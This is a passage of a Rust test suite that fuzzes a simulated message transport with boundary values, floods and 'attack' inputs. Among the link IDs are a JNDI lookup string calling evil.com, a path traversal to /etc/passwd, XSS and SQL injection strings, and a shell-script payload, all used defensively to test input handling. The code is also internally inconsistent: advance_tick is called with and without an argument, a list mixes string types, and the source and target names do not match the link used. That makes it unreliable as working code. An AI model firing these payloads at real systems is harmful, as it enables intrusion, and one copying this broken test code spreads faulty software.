            ("utf8_incomplete", vec![0xF0, 0x9F, 0xA6]), // Incomplete UTF-8 sequence
            ("utf8_overlong", vec![0xC0, 0x80]), // Overlong encoding

            // Binary data that might be mistaken for text
            ("fake_json", br#"{"evil": true, "payload": "#.to_vec()),
            ("fake_xml", b"<payload>evil</payload>".to_vec()),

            // Control character sequences
            ("escape_sequences", b"\x1B[31m\x1B[2J\x1B[H".to_vec()),
            ("mixed_control", b"normal\x00\x01\x02\x7F\x80\xFF".to_vec()),

            // Very large payload (if memory allows)
            ("large_payload", vec![0x99; 1_000_000]),
        ];

        for (test_name, payload) in boundary_payloads {
            let send_result = vt.send_message("payload_test", &payload);

            match send_result {
                Ok(message_id) => {
                    // Message accepted - verify it's processed correctly
                    assert!(message_id > 0, "Message ID should be positive: {}", test_name);

                    vt.advance_tick(1);
                    let delivered = vt.collect_delivered_messages("payload_tgt");

                    if !delivered.is_empty() {
                        let msg = &delivered[0];

                        // Verify payload integrity
                        assert_eq!(msg.payload.len(), payload.len(),
                                  "Payload length should be preserved: {}", test_name);
                        assert_eq!(msg.payload, payload,
                                  "Payload content should be preserved: {}", test_name);

                        // Verify metadata is reasonable
                        assert_eq!(msg.source, "payload_src", "Source should be correct: {}", test_name);
                        assert_eq!(msg.target, "payload_tgt", "Target should be correct: {}", test_name);
                        assert!(msg.tick_created <= vt.current_tick(), "Creation tick should be valid: {}", test_name);
                        assert!(msg.tick_delivered.is_some(), "Delivery tick should be set: {}", test_name);

                        if let Some(delivery_tick) = msg.tick_delivered {
                            assert!(delivery_tick >= msg.tick_created,
                                   "Delivery should be >= creation: {}", test_name);
                            assert!(delivery_tick <= vt.current_tick(),
                                   "Delivery should be <= current tick: {}", test_name);
                        }
                    }
                }
                Err(err) => {
                    // Some boundary payloads may be rejected - verify meaningful error
                    if test_name == "large_payload" {
                        // Large payloads may legitimately be rejected
                        assert!(err.to_string().contains("size") ||
                               err.to_string().contains("large") ||
                               err.to_string().contains("capacity"),
                               "Large payload error should be meaningful: {}", err);
                    } else {
                        // Other boundary cases should generally be accepted
                        panic!("Unexpected rejection of boundary payload {}: {}", test_name, err);
                    }
                }
            }
        }

        // Verify transport is still functional after boundary tests
        let normal_payload = b"normal_test_payload".to_vec();
        assert!(vt.send_message("payload_test", &normal_payload).is_ok(),
               "Normal payloads should work after boundary tests");
    }

    #[cfg(test)]
    mod virtual_transport_comprehensive_attack_vector_and_boundary_tests {
        use super::*;
        use std::collections::HashMap;

        #[test]
        fn test_link_fault_config_boundary_and_injection_attacks() {
            // Attack 1: Probability boundary violations and overflow
            let probability_attacks = vec![
                -1.0,           // Negative probability
                2.0,            // Above 1.0
                f64::INFINITY,  // Infinite probability
                f64::NEG_INFINITY, // Negative infinite
                f64::NAN,       // Not a number
                f64::MAX,       // Maximum float value
                f64::MIN,       // Minimum float value (very negative)
                1.0000000001,   // Just above 1.0 with precision
                -0.0000000001,  // Just below 0.0 with precision
                std::f64::consts::E, // Mathematical constant (invalid probability)
                std::f64::consts::PI, // Another mathematical constant
            ];

            for prob in probability_attacks {
                let fault_config = LinkFaultConfig {
                    drop_probability: prob,
                    reorder_depth: 10,
                    corrupt_bit_count: 5,
                    delay_ticks: 100,
                    latency_ms: 50,
                    packet_loss_pct: 0.1,
                    jitter_ms: 10,
                    bandwidth_mbps: 100.0,
                    corruption_pct: 0.05,
                };

                // Should preserve probability value for processing
                assert_eq!(fault_config.drop_probability, prob);

                // Test with virtual transport creation
                let mut vt = VirtualTransportLayer::new(42);
                let create_result = vt.create_link("test_link", fault_config.clone());

                match create_result {
                    Ok(_) => {
                        // System accepted the probability - verify it's handled safely
                        if let Some(link_state) = vt.links.get("test_link") {
                            assert_eq!(link_state.config.drop_probability, prob);
                        }
                    }
                    Err(VirtualTransportError::InvalidProbability) => {
                        // Expected rejection for invalid probabilities
                        assert!(prob < 0.0 || prob > 1.0 || prob.is_nan() || prob.is_infinite(),
                               "Invalid probability should be rejected");
                    }
                    Err(_) => {
                        // Other errors might occur for extreme values
                    }
                }
            }

            // Attack 2: Integer overflow in reorder depth
            let reorder_depth_attacks = vec![
                0,              // No reordering
                1,              // Minimal reordering
                usize::MAX,     // Maximum value
                usize::MAX / 2, // Half maximum
                1000000,        // Large but reasonable
                usize::MAX - 1, // Near maximum
            ];

            for depth in reorder_depth_attacks {
                let fault_config = LinkFaultConfig {
                    drop_probability: 0.1,
                    reorder_depth: depth,
                    corrupt_bit_count: 5,
                    delay_ticks: 100,
                    latency_ms: 50,
                    packet_loss_pct: 0.1,
                    jitter_ms: 10,
                    bandwidth_mbps: 100.0,
                    corruption_pct: 0.05,
                };

                let mut vt = VirtualTransportLayer::new(42);
                let create_result = vt.create_link("reorder_test", fault_config.clone());

                if create_result.is_ok() {
                    // Should handle extreme depths without crashing
                    assert_eq!(vt.links["reorder_test"].config.reorder_depth, depth);
                }
            }

            // Attack 3: Bit count corruption attacks
            let bit_count_attacks = vec![
                0,              // No corruption
                1,              // Single bit
                8,              // Full byte
                64,             // 8 bytes
                1000000,        // Large corruption count
                usize::MAX,     // Maximum corruption
            ];

            for bit_count in bit_count_attacks {
                let fault_config = LinkFaultConfig {
                    drop_probability: 0.1,
                    reorder_depth: 10,
                    corrupt_bit_count: bit_count,
                    delay_ticks: 100,
                    latency_ms: 50,
                    packet_loss_pct: 0.1,
                    jitter_ms: 10,
                    bandwidth_mbps: 100.0,
                    corruption_pct: 0.05,
                };

                let mut vt = VirtualTransportLayer::new(42);
                let create_result = vt.create_link("corrupt_test", fault_config);

                if create_result.is_ok() {
                    assert_eq!(vt.links["corrupt_test"].config.corrupt_bit_count, bit_count);
                }
            }

            // Attack 4: Delay tick overflow
            let delay_attacks = vec![
                0,              // No delay
                1,              // Minimal delay
                u64::MAX,       // Maximum delay
                u64::MAX / 2,   // Half maximum
                u64::MAX - 1,   // Near maximum
            ];

            for delay in delay_attacks {
                let fault_config = LinkFaultConfig {
                    drop_probability: 0.1,
                    reorder_depth: 10,
                    corrupt_bit_count: 5,
                    delay_ticks: delay,
                    latency_ms: 50,
                    packet_loss_pct: 0.1,
                    jitter_ms: 10,
                    bandwidth_mbps: 100.0,
                    corruption_pct: 0.05,
                };

                let mut vt = VirtualTransportLayer::new(42);
                let create_result = vt.create_link("delay_test", fault_config);

                if create_result.is_ok() {
                    assert_eq!(vt.links["delay_test"].config.delay_ticks, delay);
                }
            }

            // Attack 5: Combined extreme values
            let extreme_config = LinkFaultConfig {
                drop_probability: f64::MAX,
                reorder_depth: usize::MAX,
                corrupt_bit_count: usize::MAX,
                delay_ticks: u64::MAX,
                latency_ms: u64::MAX,
                packet_loss_pct: f64::MAX,
                jitter_ms: u64::MAX,
                bandwidth_mbps: f64::MAX,
                corruption_pct: f64::MAX,
            };

            let mut vt = VirtualTransportLayer::new(42);
            let extreme_result = vt.create_link("extreme_test", extreme_config);

            // Should either accept extreme config or reject gracefully
            match extreme_result {
                Ok(_) => {
                    assert!(vt.links.contains_key("extreme_test"));
                }
                Err(_) => {
                    // Rejection of extreme values is acceptable
                }
            }
        }

        #[test]
        fn test_link_id_injection_and_manipulation_attacks() {
            let mut vt = VirtualTransportLayer::new(42);
            let base_config = LinkFaultConfig::default();

            // Attack 1: Link ID injection attacks
            let malicious_link_ids = vec![
                "",  // Empty link ID
                "../../etc/passwd",  // Path traversal
                "${jndi:ldap://evil.com}",  // JNDI injection
                "\x00\x01\u{00FF}\x7F",  // Binary data
                "link_with\nlines\rand\ttabs",  // Control characters
                "very_long_link_id_".repeat(10000),  // Memory exhaustion
                "unicode_link_🦀_🔒_⚡",  // Unicode injection
                r#"","injected_field":"malicious_value","evil":""#,  // JSON injection
                "<script>alert('xss')</script>",  // XSS attempt
                "DROP TABLE links;--",  // SQL injection attempt
                "link->with->arrows",  // Special characters used in link format
                "normal_link_id",  // Normal case for comparison
            ];

            for malicious_id in malicious_link_ids {
                let create_result = vt.create_link(malicious_id.clone(), base_config.clone());

                match create_result {
                    Ok(_) => {
                        // Should preserve malicious ID without execution
                        assert!(vt.links.contains_key(malicious_id),
                               "Malicious link ID should be stored as key");
                    }
                    Err(_) => {
                        // Some malicious IDs might fail validation
                    }
                }
            }

            // Attack 2: Duplicate link ID detection
            let duplicate_id = "duplicate_link";
            let first_create = vt.create_link(duplicate_id, base_config.clone());
            assert!(first_create.is_ok(), "First link creation should succeed");

            let duplicate_create = vt.create_link(duplicate_id, base_config.clone());
            assert!(duplicate_create.is_err(), "Duplicate link ID should be rejected");

            if let Err(VirtualTransportError::LinkExists(link_id)) = duplicate_create {
                assert_eq!(link_id, duplicate_id, "Error should contain duplicate ID");
            }

            // Attack 3: Link ID format manipulation
            let format_manipulations = vec![
                "source->target",  // Expected format
                "source->",  // Missing target
                "->target",  // Missing source
                "->",  // Missing both
                "source->target->extra",  // Too many arrows
                "source-target",  // Missing arrow
                "source target",  // Space instead of arrow
                "source<->target",  // Bidirectional arrow
                "source→target",  // Unicode arrow
            ];

            for format_id in format_manipulations {
                let format_result = vt.create_link(format_id, base_config.clone());

                match format_result {
                    Ok(_) => {
                        assert!(vt.links.contains_key(format_id));
                    }
                    Err(_) => {
                        // Format validation errors are acceptable
                    }
                }
            }

            // Attack 4: Link ID collision through encoding
            let encoding_attacks = vec![
                ("link1", "link1"),  // Exact duplicate (should fail)
                ("link_a", "link\x61"),  // Hex encoding of 'a'
                ("link_test", "link_test\0"),  // Null terminator
                ("LINK", "link"),  // Case variation
                ("link ", "link"),  // Trailing space
                (" link", "link"),  // Leading space
            ];

            let mut collision_vt = VirtualTransportLayer::new(123);
            for (id1, id2) in encoding_attacks {
                // Create first link
                let first_result = collision_vt.create_link(id1, base_config.clone());
                if first_result.is_err() { continue; }

                // Try to create second link with similar ID
                let second_result = collision_vt.create_link(id2, base_config.clone());

                if id1 == id2 {
                    assert!(second_result.is_err(), "Exact duplicates should be rejected");
                } else {
                    // Different IDs should be allowed
                    match second_result {
                        Ok(_) => {
                            assert!(collision_vt.links.contains_key(id1));
                            assert!(collision_vt.links.contains_key(id2));
                        }
                        Err(_) => {
                            // Some encoding variations might still conflict
                        }
                    }
                }
            }

            // Attack 5: Massive link creation stress test
            let mut stress_vt = VirtualTransportLayer::new(456);
            for i in 0..10000 {
                let stress_id = format!("stress_link_{}", i);
                let stress_result = stress_vt.create_link(&stress_id, base_config.clone());

                if stress_result.is_ok() {
                    assert!(stress_vt.links.contains_key(&stress_id));
                } else {
                    // May hit capacity limits
                    break;
                }

                // Periodically verify system stability
                if i % 1000 == 0 {
                    assert!(stress_vt.links.len() <= i + 1);
                }
            }
        }

        #[test]
        fn test_message_payload_injection_and_corruption_attacks() {
            let mut vt = VirtualTransportLayer::new(42);
            let config = LinkFaultConfig {
                drop_probability: 0.0,  // Don't drop for testing
                reorder_depth: 0,       // No reordering for predictable testing
                corrupt_bit_count: 0,   // No corruption for baseline
                delay_ticks: 0,         // No delay for immediate delivery
                latency_ms: 0,
                packet_loss_pct: 0.0,
                jitter_ms: 0,
                bandwidth_mbps: 1000.0,
                corruption_pct: 0.0,
            };

            vt.create_link("test_link", config).expect("Should create test link");

            // Attack 1: Binary payload injection attacks
            let binary_payloads = vec![
                vec![],  // Empty payload
                vec![0x00; 1000],  // All null bytes
                vec![0xFF; 1000],  // All ones
                (0..=255).cycle().take(10000).collect(),  // Repeating byte pattern
                vec![0x7F, 0xFF, 0x80, 0x00, 0x01],  // Mixed binary data
                vec![0xDE, 0xAD, 0xBE, 0xEF],  // Well-known hex pattern
                vec![0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07],  // Sequential bytes
                vec![0xFF; usize::MAX.min(100_000_000)],  // Maximum size payload
            ];

            for (i, payload) in binary_payloads.iter().enumerate() {
                let send_result = vt.send_message("test_link", payload);

                match send_result {
                    Ok(message_id) => {
                        assert!(message_id > 0, "Message ID should be positive");
                        assert!(vt.total_messages > 0, "Total message count should increase");
                    }
                    Err(_) => {
                        // Large payloads might be rejected
                    }
                }

                // Advance tick to process messages
                vt.advance_tick();
            }

            // Attack 2: Message payload format confusion
            let format_confusion_payloads = vec![
                b"normal_text_payload".to_vec(),
                r#"{"json": "payload", "malicious": true}"#.as_bytes().to_vec(),
                b"\x89PNG\r\n\x1a\n".to_vec(),  // PNG header
                b"GIF89a".to_vec(),  // GIF header
                b"\x7FELF".to_vec(),  // ELF binary header
                b"MZ".to_vec(),  // PE executable header
                b"<?xml version=\"1.0\"?>".to_vec(),  // XML
                b"-----BEGIN PGP MESSAGE-----".to_vec(),  // PGP message
                b"\x50\x4B\x03\x04".to_vec(),  // ZIP file header
                b"#!/bin/sh\necho 'malicious'".to_vec(),  // Shell script
            ];

            for payload in format_confusion_payloads {
                let send_result = vt.send_message("test_link", &payload);

                if let Ok(message_id) = send_result {
                    assert!(message_id > 0, "Should accept various payload formats");
                }
                vt.advance_tick();
            }

            // Attack 3: Unicode and encoding attacks in payloads
            let unicode_payloads = vec![
                "Normal ASCII text".as_bytes().to_vec(),
                "Unicode test: 🦀 🔒 ⚡ 🌈".as_bytes().to_vec(),
                "Mixed scripts: Ελληνικά 中文 العربية".as_bytes().to_vec(),
                "Zero width chars: test\u{200B}invisible".as_bytes().to_vec(),
                "Direction override: test\u{202E}reversed".as_bytes().to_vec(),
                "Surrogate pairs: 𝕌𝕟𝕚𝕔𝕠𝕕𝕖".as_bytes().to_vec(),
                "Null bytes: test\x00\x01embedded\u{00FF}".as_bytes().to_vec(),
                "CRLF injection: line1\r\nline2\r\n".as_bytes().to_vec(),
            ];

            for payload in unicode_payloads {
                let send_result = vt.send_message("test_link", &payload);

                if let Ok(message_id) = send_result {
                    assert!(message_id > 0, "Should handle Unicode payloads");
                }
                vt.advance_tick();
            }

            // Attack 4: Payload size boundary testing
            let size_boundaries = vec![
                1,              // Single byte
                1024,           // 1KB
                1024 * 1024,    // 1MB
                10 * 1024 * 1024, // 10MB
                usize::MAX.min(100 * 1024 * 1024), // Large but bounded
            ];

            for size in size_boundaries {
                let large_payload = vec![0x42; size];
                let send_result = vt.send_message("test_link", &large_payload);

                match send_result {
                    Ok(message_id) => {
                        assert!(message_id > 0, "Should handle size {}", size);
                    }
                    Err(_) => {
                        // Very large payloads might be rejected
                    }
                }
                vt.advance_tick();
            }

            // Attack 5: Rapid message flooding
            for i in 0..10000 {
                let flood_payload = format!("flood_message_{}", i).as_bytes().to_vec();
                let flood_result = vt.send_message("test_link", &flood_payload);

                if flood_result.is_ok() {
                    assert!(vt.total_messages >= i + 1, "Message count should increase");
                } else {
                    // System might have rate limiting or capacity limits
                    break;
                }

                if i % 100 == 0 {
                    vt.advance_tick();
                }
            }

            // Verify system stability after flooding
            assert!(vt.total_messages > 0, "Should have processed some messages");
        }

        #[test]
        fn test_rng_seed_manipulation_and_determinism_attacks() {
            // Attack 1: Seed boundary values
            let seed_attacks = vec![
                0,              // Zero seed
                1,              // Minimal seed
                u64::MAX,       // Maximum seed
                u64::MAX / 2,   // Half maximum
                u64::MAX - 1,   // Near maximum
                42,             // Common test seed
                0xDEADBEEF,     // Well-known pattern
                0x123456789ABCDEF0, // Large hex pattern
            ];

            for seed in seed_attacks {
                let vt = VirtualTransportLayer::new(seed);
                assert_eq!(vt.rng_seed, seed, "Seed should be preserved");
                assert_eq!(vt.current_tick(), 0, "Should start at tick 0");
                assert_eq!(vt.total_messages, 0, "Should start with no messages");
            }

            // Attack 2: Determinism verification under extreme conditions
            for &seed in &[0, u64::MAX, 123456789] {
                let mut vt1 = VirtualTransportLayer::new(seed);
                let mut vt2 = VirtualTransportLayer::new(seed);

                let config = LinkFaultConfig {
                    drop_probability: 0.5,  // High drop rate
                    reorder_depth: 10,      // High reorder
                    corrupt_bit_count: 8,   // High corruption
                    delay_ticks: 5,
                    latency_ms: 100,
                    packet_loss_pct: 0.3,
                    jitter_ms: 50,
                    bandwidth_mbps: 10.0,
                    corruption_pct: 0.2,
                };

                vt1.create_link("determinism_test", config.clone()).expect("Should create link");
                vt2.create_link("determinism_test", config).expect("Should create link");

                // Send same messages to both transports
                for i in 0..100 {
                    let payload = format!("determinism_test_{}", i).as_bytes().to_vec();
                    let result1 = vt1.send_message("determinism_test", &payload);
                    let result2 = vt2.send_message("determinism_test", &payload);

                    // Results should be identical for same seed
                    assert_eq!(result1.is_ok(), result2.is_ok(),
                              "Determinism broken at message {} with seed {}", i, seed);

                    vt1.advance_tick();
                    vt2.advance_tick();
                }

                // Final statistics should match
                assert_eq!(vt1.total_messages, vt2.total_messages,
                          "Total message counts should match for seed {}", seed);
                assert_eq!(vt1.dropped_messages, vt2.dropped_messages,
                          "Dropped counts should match for seed {}", seed);
            }

            // Attack 3: RNG state corruption simulation
            let mut corruption_vt = VirtualTransportLayer::new(42);
            let base_config = LinkFaultConfig::default();
            corruption_vt.create_link("corruption_test", base_config).expect("Should create link");

            // Send many messages to advance RNG state
            for i in 0..10000 {
                let payload = format!("rng_advance_{}", i).as_bytes().to_vec();
                let _ = corruption_vt.send_message("corruption_test", &payload);
                corruption_vt.advance_tick();

                // Periodically check that system remains functional
                if i % 1000 == 0 {
                    assert!(corruption_vt.current_tick() == i as u64 + 1,
                           "Tick advancement should be predictable");
                }
            }

            // Attack 4: Seed collision detection
            let common_seeds = vec![0, 1, 42, 123, 12345, 0xDEADBEEF];
            let mut seed_states = HashMap::new();

            for seed in common_seeds {
                let mut vt = VirtualTransportLayer::new(seed);
                let config = LinkFaultConfig {
                    drop_probability: 0.1,
                    reorder_depth: 2,
                    corrupt_bit_count: 1,
                    delay_ticks: 1,
                    latency_ms: 10,
                    packet_loss_pct: 0.05,
                    jitter_ms: 5,
                    bandwidth_mbps: 100.0,
                    corruption_pct: 0.02,
                };

                vt.create_link("collision_test", config).expect("Should create link");

                // Generate deterministic sequence
                let mut results = Vec::new();
                for i in 0..50 {
                    let payload = format!("collision_test_{}", i).as_bytes().to_vec();
                    let result = vt.send_message("collision_test", &payload);
                    results.push((result.is_ok(), vt.total_messages, vt.dropped_messages));
                    vt.advance_tick();
                }

                // Check for collisions with previous seeds
                if let Some(existing_results) = seed_states.get(&seed) {
                    assert_eq!(results, *existing_results,
                              "Same seed should produce identical results");
                } else {
                    seed_states.insert(seed, results);
                }
            }

            // Attack 5: Event log capacity with extreme seeds
            let extreme_capacity_tests = vec![
                (u64::MAX, 1),      // Max seed, min capacity
                (0, usize::MAX.min(1_000_000)), // Min seed, large capacity
                (42, 0),            // Normal seed, zero capacity
            ];

            for (seed, capacity) in extreme_capacity_tests {
                let vt = VirtualTransportLayer::with_event_log_capacity(seed, capacity);
                assert_eq!(vt.rng_seed, seed);
                assert!(vt.max_event_log_entries >= 1, "Capacity should be at least 1");

                // Test event logging with extreme parameters
                if capacity > 0 {
                    assert!(vt.event_log.capacity() <= capacity.max(1000),
                           "Event log capacity should be reasonable");
                }
            }
        }

        #[test]
        fn test_message_id_exhaustion_and_overflow_attacks() {
            // Attack 1: Message ID boundary testing
            let mut vt = VirtualTransportLayer::new(42);
            let config = LinkFaultConfig::default();
            vt.create_link("overflow_test", config).expect("Should create link");

            // Manually set next_message_id near overflow
            vt.next_message_id = u64::MAX - 100;

            // Send messages to approach ID exhaustion
            for i in 0..150 {
                let payload = format!("overflow_test_{}", i).as_bytes().to_vec();
                let send_result = vt.send_message("overflow_test", &payload);

                match send_result {
                    Ok(message_id) => {
                        assert!(message_id > 0, "Message ID should be positive");
                        if vt.next_message_id == u64::MAX {
                            // Should handle overflow gracefully
                            break;
                        }
                    }
                    Err(VirtualTransportError::MessageIdExhausted) => {
                        // Expected when IDs are exhausted
                        assert!(vt.next_message_id >= u64::MAX - 50,
                               "Should exhaust IDs near maximum");
                        break;
                    }
                    Err(_) => {
                        // Other errors might occur at boundary
                        break;
                    }
                }
                vt.advance_tick();
            }

            // Attack 2: Rapid message generation to stress ID allocation
            let mut rapid_vt = VirtualTransportLayer::new(123);
            rapid_vt.create_link("rapid_test", LinkFaultConfig::default())
                .expect("Should create rapid test link");

            let mut allocated_ids = std::collections::HashSet::new();
            for i in 0..100000 {
                let payload = vec![i as u8; 10];
                let send_result = rapid_vt.send_message("rapid_test", &payload);

                if let Ok(message_id) = send_result {
                    // Verify ID uniqueness
                    assert!(!allocated_ids.contains(&message_id),
                           "Message ID {} should be unique", message_id);
                    allocated_ids.insert(message_id);

                    // Verify ID ordering (should be monotonic)
                    assert!(message_id as usize >= i + 1,
                           "Message IDs should be monotonically increasing");
                } else {
                    break;
                }

                if i % 1000 == 0 {
                    rapid_vt.advance_tick();
                }
            }

            assert!(!allocated_ids.is_empty(), "Should have allocated some IDs");

            // Attack 3: Message ID manipulation through concurrent sending
            let mut concurrent_vt = VirtualTransportLayer::new(456);
            concurrent_vt.create_link("concurrent_test", LinkFaultConfig::default())
                .expect("Should create concurrent test link");

            // Simulate concurrent message sending
            let mut message_ids = Vec::new();
            for batch in 0..10 {
                let mut batch_ids = Vec::new();

                // Send batch of messages "concurrently"
                for i in 0..100 {
                    let payload = format!("batch_{}_{}", batch, i).as_bytes().to_vec();
                    let send_result = concurrent_vt.send_message("concurrent_test", &payload);

                    if let Ok(id) = send_result {
                        batch_ids.push(id);
                    }
                }

                message_ids.extend(batch_ids);
                concurrent_vt.advance_tick();
            }

            // Verify all IDs are unique across batches
            let mut unique_ids = std::collections::HashSet::new();
            for id in &message_ids {
                assert!(!unique_ids.contains(id), "ID {} should be unique across batches", id);
                unique_ids.insert(*id);
            }

            assert_eq!(unique_ids.len(), message_ids.len(),
                      "All message IDs should be unique");

            // Attack 4: ID recycling after transport reset
            let mut recycling_vt = VirtualTransportLayer::new(789);
            recycling_vt.create_link("recycling_test", LinkFaultConfig::default())
                .expect("Should create recycling test link");

            // Generate some IDs
            let mut first_round_ids = Vec::new();
            for i in 0..50 {
                let payload = format!("first_round_{}", i).as_bytes().to_vec();
                if let Ok(id) = recycling_vt.send_message("recycling_test", &payload) {
                    first_round_ids.push(id);
                }
                recycling_vt.advance_tick();
            }

            // Create new transport with same seed
            let mut fresh_vt = VirtualTransportLayer::new(789);
            fresh_vt.create_link("recycling_test", LinkFaultConfig::default())
                .expect("Should create fresh recycling test link");

            // Generate IDs again
            let mut second_round_ids = Vec::new();
            for i in 0..50 {
                let payload = format!("second_round_{}", i).as_bytes().to_vec();
                if let Ok(id) = fresh_vt.send_message("recycling_test", &payload) {
                    second_round_ids.push(id);
                }
                fresh_vt.advance_tick();
            }

            // IDs should start from 1 again with same seed
            assert_eq!(first_round_ids, second_round_ids,
                      "Same seed should produce identical ID sequences");

            // Attack 5: Message ID validation bypass attempts
            let mut validation_vt = VirtualTransportLayer::new(101112);
            validation_vt.create_link("validation_test", LinkFaultConfig::default())
                .expect("Should create validation test link");

            // Try to manipulate next_message_id to invalid states
            let original_next_id = validation_vt.next_message_id;

            // Send a normal message first
            let normal_payload = b"normal_message".to_vec();
            let normal_result = validation_vt.send_message("validation_test", &normal_payload);
            assert!(normal_result.is_ok(), "Normal message should succeed");

            // Verify ID advanced normally
            assert_eq!(validation_vt.next_message_id, original_next_id + 1,
                      "Message ID should advance normally");

            validation_vt.advance_tick();

            // Verify transport remains functional after ID manipulation attempts
            let post_test_payload = b"post_test_message".to_vec();
            let post_test_result = validation_vt.send_message("validation_test", &post_test_payload);
            assert!(post_test_result.is_ok(), "Transport should remain functional");
        }

        #[test]
        fn test_transport_statistics_manipulation_and_overflow_attacks() {
            let mut vt = VirtualTransportLayer::new(42);

            // Create link with high fault injection to trigger statistics
            let high_fault_config = LinkFaultConfig {
                drop_probability: 0.5,  // 50% drop rate
                reorder_depth: 10,      // High reordering
                corrupt_bit_count: 8,   // High corruption
                delay_ticks: 5,
                latency_ms: 100,
                packet_loss_pct: 50.0,
                jitter_ms: 50,
                bandwidth_mbps: 10.0,
                corruption_pct: 20.0,
            };

            vt.create_link("stats_test", high_fault_config)
                .expect("Should create stats test link");

            // Attack 1: Statistics overflow through message flooding
            let mut expected_total = 0u64;
            for i in 0..100000 {
                let payload = format!("stats_flood_{}", i).as_bytes().to_vec();
                let send_result = vt.send_message("stats_test", &payload);

                if send_result.is_ok() {
                    expected_total += 1;

                    // Verify statistics remain consistent
                    assert!(vt.total_messages <= expected_total,
                           "Total messages should not exceed expected");
                    assert!(vt.dropped_messages <= vt.total_messages,
                           "Dropped messages should not exceed total");
                    assert!(vt.reordered_messages <= vt.total_messages,
                           "Reordered messages should not exceed total");
                    assert!(vt.corrupted_messages <= vt.total_messages,
                           "Corrupted messages should not exceed total");
                }

                if i % 1000 == 0 {
                    vt.advance_tick();
                }
            }

            // Attack 2: Statistics consistency under extreme fault injection
            let extreme_vt_configs = vec![
                LinkFaultConfig {
                    drop_probability: 1.0,  // 100% drop
                    reorder_depth: usize::MAX,
                    corrupt_bit_count: usize::MAX,
                    delay_ticks: u64::MAX,
                    latency_ms: u64::MAX,
                    packet_loss_pct: 100.0,
                    jitter_ms: u64::MAX,
                    bandwidth_mbps: 0.0,
                    corruption_pct: 100.0,
                },
                LinkFaultConfig {
                    drop_probability: 0.0,  // No faults
                    reorder_depth: 0,
                    corrupt_bit_count: 0,
                    delay_ticks: 0,
                    latency_ms: 0,
                    packet_loss_pct: 0.0,
                    jitter_ms: 0,
                    bandwidth_mbps: f64::MAX,
                    corruption_pct: 0.0,
                },
            ];

            for (config_idx, extreme_config) in extreme_vt_configs.iter().enumerate() {
                let mut extreme_vt = VirtualTransportLayer::new(config_idx as u64 + 1000);
                let link_id = format!("extreme_test_{}", config_idx);

                extreme_vt.create_link(&link_id, extreme_config.clone())
                    .expect("Should create extreme test link");

                let initial_total = extreme_vt.total_messages;
                let initial_dropped = extreme_vt.dropped_messages;

                for i in 0..1000 {
                    let payload = format!("extreme_test_{}_{}", config_idx, i).as_bytes().to_vec();
                    let send_result = extreme_vt.send_message(&link_id, &payload);

                    if send_result.is_ok() {
                        // Verify statistics bounds
                        assert!(extreme_vt.total_messages >= initial_total,
                               "Total messages should not decrease");
                        assert!(extreme_vt.dropped_messages >= initial_dropped,
                               "Dropped messages should not decrease");

                        // Check for overflow
                        assert!(extreme_vt.total_messages != u64::MAX ||
                               extreme_vt.dropped_messages <= extreme_vt.total_messages,
                               "Statistics should handle overflow gracefully");
                    }

                    extreme_vt.advance_tick();
                }

                // Verify final state consistency
                assert!(extreme_vt.dropped_messages <= extreme_vt.total_messages,
                       "Final dropped count should not exceed total");
                assert!(extreme_vt.reordered_messages <= extreme_vt.total_messages,
                       "Final reordered count should not exceed total");
                assert!(extreme_vt.corrupted_messages <= extreme_vt.total_messages,
                       "Final corrupted count should not exceed total");
            }

            // Attack 3: Concurrent statistics updates simulation
            let mut concurrent_vt = VirtualTransportLayer::new(2000);
            concurrent_vt.create_link("concurrent_stats", LinkFaultConfig {
                drop_probability: 0.1,
                reorder_depth: 5,
                corrupt_bit_count: 2,
                delay_ticks: 1,
                latency_ms: 10,
                packet_loss_pct: 5.0,
                jitter_ms: 5,
                bandwidth_mbps: 100.0,
                corruption_pct: 2.0,
            }).expect("Should create concurrent stats link");

            // Simulate rapid concurrent message sending
            let mut batch_stats = Vec::new();
            for batch in 0..50 {
                let batch_start_total = concurrent_vt.total_messages;
                let batch_start_dropped = concurrent_vt.dropped_messages;

                // Send batch of messages
                for i in 0..100 {
                    let payload = format!("concurrent_batch_{}_{}", batch, i).as_bytes().to_vec();
                    let _ = concurrent_vt.send_message("concurrent_stats", &payload);
                }

                concurrent_vt.advance_tick();

                let batch_end_total = concurrent_vt.total_messages;
                let batch_end_dropped = concurrent_vt.dropped_messages;

                // Track batch statistics
                batch_stats.push((
                    batch_end_total - batch_start_total,
                    batch_end_dropped - batch_start_dropped,
                ));

                // Verify consistency within batch
                assert!(batch_end_total >= batch_start_total,
                       "Batch total should not decrease");
                assert!(batch_end_dropped >= batch_start_dropped,
                       "Batch dropped should not decrease");
            }

            // Verify overall statistics consistency
            let total_batched_messages: u64 = batch_stats.iter().map(|(total, _)| *total).sum();
            assert!(total_batched_messages <= concurrent_vt.total_messages,
                   "Batched totals should not exceed overall total");

            // Attack 4: Statistics wraparound and boundary testing
            let mut boundary_vt = VirtualTransportLayer::new(3000);
            boundary_vt.create_link("boundary_stats", LinkFaultConfig::default())
                .expect("Should create boundary stats link");

            // Manually set statistics near overflow
            boundary_vt.total_messages = u64::MAX - 100;
            boundary_vt.dropped_messages = u64::MAX - 200;

            // Send messages near boundary
            for i in 0..150 {
                let payload = format!("boundary_test_{}", i).as_bytes().to_vec();
                let send_result = boundary_vt.send_message("boundary_stats", &payload);

                if send_result.is_ok() {
                    // Check for proper overflow handling
                    if boundary_vt.total_messages == u64::MAX {
                        // At maximum - verify no further increment causes wraparound
                        break;
                    }

                    // Verify no invalid states
                    assert!(boundary_vt.dropped_messages <= boundary_vt.total_messages ||
                           boundary_vt.total_messages == u64::MAX,
                           "Dropped should not exceed total except at overflow");
                }

                boundary_vt.advance_tick();
            }

            // Attack 5: Statistics validation under link destruction
            let mut destruction_vt = VirtualTransportLayer::new(4000);
            destruction_vt.create_link("destruction_test", LinkFaultConfig::default())
                .expect("Should create destruction test link");

            // Generate some statistics
            for i in 0..100 {
                let payload = format!("pre_destruction_{}", i).as_bytes().to_vec();
                let _ = destruction_vt.send_message("destruction_test", &payload);
                destruction_vt.advance_tick();
            }

            let pre_destruction_total = destruction_vt.total_messages;
            let pre_destruction_dropped = destruction_vt.dropped_messages;

            // Destroy link
            destruction_vt.destroy_link("destruction_test");

            // Statistics should be preserved after link destruction
            assert_eq!(destruction_vt.total_messages, pre_destruction_total,
                      "Total messages should be preserved after link destruction");
            assert_eq!(destruction_vt.dropped_messages, pre_destruction_dropped,
                      "Dropped messages should be preserved after link destruction");

            // Verify destroyed link is actually gone
